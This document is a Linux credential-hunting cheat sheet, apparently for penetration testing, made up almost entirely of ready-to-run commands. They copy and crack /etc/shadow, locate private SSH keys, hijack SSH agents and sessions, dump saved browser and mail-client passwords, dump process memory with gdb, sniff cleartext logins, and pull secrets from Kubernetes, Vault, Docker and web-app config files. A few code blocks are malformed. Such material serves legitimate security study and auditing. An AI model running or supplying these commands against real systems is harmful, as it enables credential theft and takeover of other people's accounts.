# Local Account Password Files

#### `/etc/passwd`
- `cat /etc/passwd`: Displays all user accounts on the system. This file contains basic user information but does not store passwords. It can still be useful for identifying potential users to target in privilege escalation attempts.
  - **Format:** 
    ```bash
    <username>:<password>:<UID>:<GID>:<User_ID_Info>:/home/directory>:/shell
    ```
  - **Example:**
    ```bash
    root:x:0:0:root:/root:/bin/ash
    ```

#### `/etc/shadow`
- `cat /etc/shadow`: Lists hashed passwords for users (requires root permissions). 
  - **Format:** 
    ```bash
    <username>:<password_hash>:<last_change>:<min_age>:<max_age>:<warn>:<inactive>:<expire>
    ```
  - **Example:**
    ```bash
    root:$6$random_salt$hashed_password:18283:0:99999:7:::
    ```

- **Check for Empty Passwords:**
	```bash
	awk -F: '($2 == "") {print $1}' /etc/shadow
	```

#### Extract and Crack Password Hashes
- Copy the `/etc/shadow` file for offline cracking:
    ```bash
    cp /etc/shadow /tmp/shadow_copy
    ```
- Use `john` or `hashcat` for cracking hashes:
    ```bash
    john --wordlist=/path/to/wordlist.txt /tmp/shadow_copy
    ```

#### Get Password Hash with Unshadow (For Cracking)
- `unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt`: Combines `/etc/passwd` and `/etc/shadow` into a format usable by cracking tools like `john` or `hashcat`.

# Sudo and Sudoers Files

- **List Sudo Privileges:** If you can run `sudo`, list the commands you are allowed to execute without a password
	```bash
	sudo -l
	```
 - **Look for commands that can be executed as root without a password (e.g., `NOPASSWD`):**
	```bash
	sudo -l | grep NOPASSWD
	```
- **Displays sudoers file (requires root or sudo):**
	```bash
	cat /etc/sudoers
	```
- **Identify Users with Sudo Privileges:**
	```bash
	grep '^sudo:.*$' /etc/group
	```

# SSH Credentials

#### SSH Private Keys
- **Locates authorized SSH keys:**
	```bash
	find / -name "authorized_keys" 2>/dev/null
	```
- **Search for private SSH keys:**
	```bash
	find / -name "id_rsa" 2>/dev/null
	find / -name "*.pem" 2>/dev/null
	```

#### Examine SSH Configuration Files
- **Lists authorized SSH keys for the current user:**
	```bash
	cat ~/.ssh/authorized_keys
	```
- **Displays private SSH key (requires read permission):**
	```bash
	cat ~/.ssh/id_rsa
	```
- **Displays SSH daemon configuration:**
	```bash
	cat /etc/ssh/sshd_config
	```

#### SSH Known Hosts
- **List Known Hosts:**
	```bash
	cat /home/<username>/.ssh/known_hosts
	```

#### SSH Agent (SSH Agent Hijacking)
- **List all users’ agents:**
	```bash
	find /tmp/ -type s -name agent.*
	```
- **Check for active SSH agent:**
	```bash
	env | grep SSH_AUTH_SOCK
	```
- **List identities currently held by SSH agent:**
	```bash
	ssh-add -L
	```
- **Hijack the SSH agent to authenticate as another user:**
	```bash
	export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.<pid>
	ssh-add -l
	```

# Credential Files and Cleartext Passwords

#### Bash History Files
- **View Bash Command History:** Bash history files might store sensitive commands, such as passwords or private keys.
	```bash
	cat /root/.bash_history
	cat /home/<user>/.bash_history
	cat /home/<user>/.zsh_history
	cat /home/<user>/.config/fish/fish_history
	```
- **Searching for Passwords:**
	```bash
	grep -i "password" /root/.bash_history
	grep -i "password" /home/<user>/.bash_history
	```

#### Search for Passwords in Configuration Files
- **Searches for the keyword 'password' in /etc/:**
	```bash
	grep -r -i "password" /etc/ 2>/dev/null
	```
- **Searches for the keyword 'pass' in user home directories:**
	```bash
	grep -r -i "pass" /home/ 2>/dev/null
	```
- **Searches for passwords in common files:**
	```bash
	grep -i 'password' /etc/passwd /etc/shadow /etc/group /etc/gshadow 2>/dev/null
	```
- **Finds and extracts passwords from configuration files:**
	```bash
	find / -name '*.conf' -exec grep -i 'password' {} \; 2>/dev/null
	```

#### Common Configuration Files Containing Passwords
- **Check command history for passwords:**
	```bash
	cat ~/.bash_history
	```
- **MySQL command history, potentially containing passwords:**
	```bash
	cat ~/.mysql_history
	```
- **WordPress configuration file containing database credentials:**
	```bash
	cat /var/www/html/wp-config.php
	```

#### Locate Potentially Sensitive Files
- **Searches for configuration files:**
	```bash
	find / -name "*.conf" 2>/dev/null
	```
- **Searches for text files (potentially containing passwords):**
	```bash
	find / -name "*.txt" 2>/dev/null
	```

#### Application Configuration Files
- **Database Credentials:** Search for files that might contain database credentials or API keys:
	```bash
	find / -name "*.conf" -type f 2>/dev/null
	grep -i "password" /etc/mysql/my.cnf
	```
    - Common locations:
      - `~/.my.cnf` (MySQL Credentials in User Home Directory)
      - `/etc/mysql/my.cnf` (System-wide MySQL Configuration File)
      - `/var/lib/postgresql/.psql_history` (PostgreSQL)
      - `~/.pgpass` (PostgreSQL)
      - `/etc/postgresql/<version>/main/pg_hba.conf` (PostgreSQL Client Authentication Configuration File)
	  - `/etc/httpd/conf/httpd.conf` (Apache web server)
- **Check if MySQL is running:**
	```bash
	ps aux | grep -i mysql
	```
- **Check if PostgreSQL is running:**
	```
	ps aux | grep -i postgres
	```

#### Environment Variables
- **Print Environment Variables:** Environment variables often store sensitive credentials such as API keys:
	```bash
	printenv
	env | grep -i password
	```

# Enumerate Network Filesystems (NFS/SMB)

- **Lists exported NFS shares:**
	```bash
	showmount -e <target_ip>
	```
- **Lists available SMB shares:**
	```
	smbclient -L //<target_ip>
	```

# Web Application Credentials

- **Environment file, often used in modern web apps for credentials:**
	```bash
	cat /var/www/html/.env
	```
- **WordPress Configuration:** WordPress stores database credentials in the `wp-config.php` file:
    ```bash
    cat /var/www/html/wp-config.php | grep DB_PASSWORD
    ```
- **Joomla Configuration:** Joomla stores database credentials in `configuration.php`:
    ```bash
    cat /var/www/html/configuration.php | grep password
    ```
- **Drupal Configuration:** Drupal stores its credentials in the `settings.php` file:
    ```bash
    cat /var/www/html/sites/default/settings.php | grep 'database\['
    ```
- **Magento Configuration:** Magento stores its database credentials in `app/etc/env.php`:
    ```bash
    cat /var/www/html/app/etc/env.php | grep password
    ```
- **Laravel Configuration:** Laravel’s environment files (`.env`) often store database credentials and API keys:
    ```bash
    cat /var/www/html/.env | grep -i 'password\|api_key'
    ```
- **Django Configuration:** Django’s database credentials are typically stored in `settings.py`:
    ```bash
    cat /var/www/html/<project_name>/settings.py | grep -i 'password'
    ```

#### Apache Web Server
- **Apache web server configuration:**
	```bash
	cat /etc/httpd/conf/httpd.conf
	```
- **Apache site configuration (Debian-based systems):**
	```bash
	cat /etc/apache2/sites-enabled/000-default.conf
	```

#### Nginx Web Server
- **Nginx main configuration file:**
	```bash
	cat /etc/nginx/nginx.conf
	```
- **Nginx site configuration:**
	```bash
	cat /etc/nginx/sites-enabled/default
	```

#### PHP Configuration (for Web Servers)
- **General PHP application configuration file:**
	```bash
	cat /var/www/html/config.php
	```
- **php.ini:** Web servers might store credentials in the `php.ini` file:
	```bash
	cat /etc/php.ini | grep -i "password"
	```

# Browser and Application Passwords

#### Firefox Stored Credentials
- **Extracts login credentials:**
	```bash
	cat ~/.mozilla/firefox/*.default-release/logins.json
	```

#### Chrome/Chromium Stored Credentials
- **SQLite database containing login data:**
	```bash
	cat ~/.config/google-chrome/Default/Login Data
	```
- **For Chromium browser:**
	```bash
	cat ~/.config/chromium/Default/Login Data
	```
- **Dump Browser Passwords with `sqlite3`:**
	```bash
	sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT origin_url, username_value, password_value FROM logins'
	```

# Passwords Stored in Memory

#### GDB (Attach to a Process)
- **Dump Process Memory:** Use `gdb` to attach to a process and dump its memory. This might allow you to retrieve plaintext passwords or sensitive information:
	```bash
	gdb -p <pid>
	(gdb) dump memory /tmp/memory_dump.bin 0x<start_address> 0x<end_address>
	```

# Password Storage Utilities

#### `gnome-keyring`
- **Gnome Keyring Dump:** If the user is running Gnome, the Gnome Keyring might store credentials:
	```bash
	strings ~/.gnome2/keyrings/login.keyring
	```

#### `seahorse`
- **Dump Seahorse Keyring:** Seahorse is the GUI for managing GPG keys and passwords. View key information:
	```bash
	seahorse
	```

# SSH Session Hijacking

#### SSH Session Hijacking via `/proc`
- **Hijack SSH Session:**
    - Identify active SSH sessions by listing `/proc` and search for `ssh`:
      ```bash
      ps aux | grep ssh
      ```
    - **Copy Environment Variables:**
      - For each SSH process, copy the environment variables such as `SSH_AUTH_SOCK`:
        ```bash
        cat /proc/<pid>/environ | tr '\0' '\n'
        export SSH_AUTH_SOCK=/proc/<pid>/fd/<fd_number>
        ```
    - **Connect as the user:**
      - Once the environment variables are set, you can authenticate as the user:
        ```bash
        ssh-add -l
        ```

# Password Sniffing

#### Tcpdump (Capture Network Traffic)
- **Capture Unencrypted Passwords:** Capture traffic to sniff clear-text credentials:
	```bash
	tcpdump -i <interface> -w /tmp/capture.pcap
	tcpdump -i <interface> 'port 21 or port 23 or port 80' -w /tmp/creds.pcap      ```

#### Wireshark
- **Analyze Captured Traffic:** Use Wireshark to open `pcap` files and filter for potential password traffic:
	```bash
	wireshark /tmp/capture.pcap
	```

# Miscellaneous Credential Sources

#### Mounted Network Shares
- **Identify Network Shares:** Network shares might contain sensitive credentials stored in configuration files:
	```bash
	mount | grep nfs
	cat /etc/fstab | grep nfs
	find /mnt -name "*.conf" 2>/dev/null
	```

#### Passwords in Backup Files
- **Search Backup Files:** Search for backups that might contain sensitive information:
	```bash
	find / -name "*.bak" 2>/dev/null
	find / -name "*.old" 2>/dev/null
	```

#### Passwords in Core Dumps
- **Locate Core Dumps:** Core dumps might contain sensitive data from crashed programs:
	```bash
	find / -name "core" 2>/dev/null
	```
  
# Git and Code Repositories

#### Searching for Sensitive Information in Git Repositories
- **Local Git Repositories:** Search for Git repositories on the system:
    ```bash
    find / -name ".git" 2>/dev/null
    ```
  - **Look for API keys, credentials, and sensitive info in committed code:**
    ```bash
    grep -r -i 'password\|key\|secret' /path/to/repository
    ```
- **Retrieve Git Commit History:** Examine previous commits for sensitive data that may have been removed but still resides in the commit history:
    ```bash
    git log -p | grep -i 'password\|key\|secret'
    ```

#### Git Configuration Credentials
- **Global Git Configuration:** Git can store credentials in its configuration files. Check global Git configuration:
    ```bash
    cat ~/.gitconfig
    ```
  - Example output:
    ```c
    [user]
      email = user@example.com
      name = User Name
    [credential]
      helper = store
    ```
- **Check Stored Credentials in `.git-credentials`:** The file `.git-credentials` may contain plain text credentials if Git is configured to store them:
    ```bash
    cat ~/.git-credentials
    ```
  - Example:
    ```
    https://username:password@github.com
    ```

# Docker and Kubernetes Credentials

#### Docker
- **Docker Configuration:** Check for sensitive information in Docker configuration files:
    ```bash
    cat ~/.docker/config.json
    ```
  - Look for credentials in Docker Compose files:
    ```bash
    grep -i 'password\|secret\|key' /path/to/docker-compose.yml
    ```
- **Search for Docker Environment Variables:** Environment variables can be used to pass sensitive information to Docker containers:
    ```bash
    docker inspect <container_id> | grep -i 'password\|key\|secret'
    ```
- **Docker Registry Credentials:** Docker registry credentials are stored in `~/.docker/config.json`:
    ```bash
    cat ~/.docker/config.json | grep auths
    ```

#### Kubernetes
- **Kubeconfig Credentials:** Kubernetes credentials are stored in the kubeconfig file (`~/.kube/config`):
    ```bash
    cat ~/.kube/config
    ```
- **Kubernetes Secrets:** List Kubernetes secrets:
    ```bash
    kubectl get secrets
    ```
  - **Retrieve specific secret values (these are often base64-encoded and need to be decoded):**
    ```bash
    kubectl get secret <secret_name> -o yaml | grep -i 'password\|key' | awk '{print $2}' | base64 -d
    ```

# Password Managers and Credential Vaults

#### Password Managers (e.g., `keepass`, `pass`)
- **KeePass:** KeePass databases (`.kdbx` files) might be present on the system. Search for them:
    ```bash
    find / -name "*.kdbx" 2>/dev/null
    ```
- **Pass:** `pass` is a password manager for Linux. Search for password stores in the user’s `~/.password-store/` directory:
    ```bash
    find ~/.password-store -type f 2>/dev/null
    cat ~/.password-store/<entry>.gpg
    ```

#### HashiCorp Vault
- **Vault Token/Session Files:** Vault stores access tokens in a file (`~/.vault-token`). These tokens can be used to access sensitive data:
    ```bash
    cat ~/.vault-token
    ```
- **Vault Configuration:** Check Vault configuration files for hardcoded credentials:
    ```bash
    cat /etc/vault/config.hcl | grep 'root_token\|secret_id\|key'
    ```

# Email Clients and Web Browsers

#### Thunderbird, Evolution, and Other Mail Clients
- **Thunderbird:** Search for saved credentials in Thunderbird’s profiles:
    ```bash
    find ~/.thunderbird/ -name "logins.json" 2>/dev/null
    cat ~/.thunderbird/<profile>/logins.json
    ```
  - Use `jq` to parse `logins.json`:
    ```bash
    cat ~/.thunderbird/<profile>/logins.json | jq '.logins[] | {hostname, username, encryptedPassword}'
    ```
- **Evolution:** Search for stored credentials in Evolution’s configuration files:
    ```bash
    cat ~/.config/evolution/sources/* | grep -i 'password'
    ```

#### Web Browser Credentials
- **Google Chrome/Chromium:** Chrome stores saved passwords in an encrypted SQLite database. The database can be accessed with `sqlite3`. Extract passwords using tools such as `chrome-decrypt` or custom scripts.
    ```bash
    sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins"
    ```
- **Firefox:** Firefox stores login data in an encrypted format in `logins.json`:
    ```bash
    cat ~/.mozilla/firefox/<profile>/logins.json | jq '.logins[] | {hostname, username, encryptedPassword}'
    ```

# Virtualization Platforms

#### VMware
- **VMware Configuration Files:** VMware stores sensitive information in `.vmx` files, such as administrative credentials:
    ```bash
    find / -name "*.vmx" 2>/dev/null
    cat /path/to/vmfile.vmx | grep -i password
    ```

#### VirtualBox
- **VirtualBox Credentials:** VirtualBox configuration files might contain credentials for shared folders, cloud providers, or networks:
    ```bash
    find ~/.VirtualBox/ -type f | grep -i 'password\|key\|credential'
    ```

# Windows Subsystem for Linux (WSL) Credentials
- **WSL User Info:** Check the `passwd` file within a WSL instance for user accounts:
    ```bash
    cat /mnt/c/Users/<user>/AppData/Local/Packages/CanonicalGroupLimited.Ubuntu*/LocalState/rootfs/etc/passwd
    ```
- **WSL Bash History:** WSL’s bash history may also store sensitive information:
    ```bash
    cat /mnt/c/Users/<user>/AppData/Local/Packages/CanonicalGroupLimited.Ubuntu*/LocalState/rootfs/home/<user>/.bash_history
    ```

# Search for Common Password Patterns

#### Grep Password Patterns in Files
- **Search for Passwords in Files:** Use `grep` to search for common password patterns (e.g., “password,” “secret,” “key,” etc.) across directories:
    ```bash
    grep -r -i 'password\|secret\|key' /etc/*
    grep -r -i 'password\|secret\|key' /home/*
    ```
- **Search for Credentials in Logs:** Often credentials are logged accidentally. Search logs for sensitive information:
    ```bash
    grep -i 'password' /var/log/*
    ```

#### Locate Files With Potentially Sensitive Information
- **Backup and Configuration Files:** Search for backup and configuration files that might contain sensitive information:
    ```bash
    find / -type f \( -name "*.bak" -o -name "*.cfg" -

o -name "*.old" -o -name "*.conf" \) 2>/dev/null
    ```
  - Example of searching for passwords in configuration files:
    ```bash
    grep -i password /etc/*.conf /home/*/.config/*
    ```

# File Carving and Steganography

#### Carving Files for Hidden Passwords
- **Binwalk:** Use `binwalk` to scan binary files for embedded files and extract them, potentially revealing sensitive data:
    ```bash
    binwalk -e <file>
    ```

#### Strings and File Analysis
- **Strings Analysis:** Use `strings` on binary files or memory dumps to extract potential passwords or API keys:
    ```bash
    strings <binary_file> | grep -i 'password\|key\|secret'
    ```